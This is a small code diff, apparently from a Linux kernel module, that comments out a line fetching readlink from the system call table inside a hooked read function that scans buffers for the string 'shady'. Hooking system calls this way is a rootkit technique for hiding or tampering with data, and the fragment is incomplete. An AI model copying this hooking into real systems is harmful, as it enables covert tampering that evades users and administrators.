@@ -99,7 +99,7 @@ asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
           int searchIndex = 0;
           int searchLength = 5;
           char searchText[] = "shady";
-          (*readlink_ptr)(const char *path, char *buf, size_t bufsiz) = ((unsigned long **)system_call_table_address)[__NR_readlink];
+          //(*readlink_ptr)(const char *path, char *buf, size_t bufsiz) = ((unsigned long **)system_call_table_address)[__NR_readlink];
           //readlink_ptr("")
           for(i=0; i<count; i++)
           {
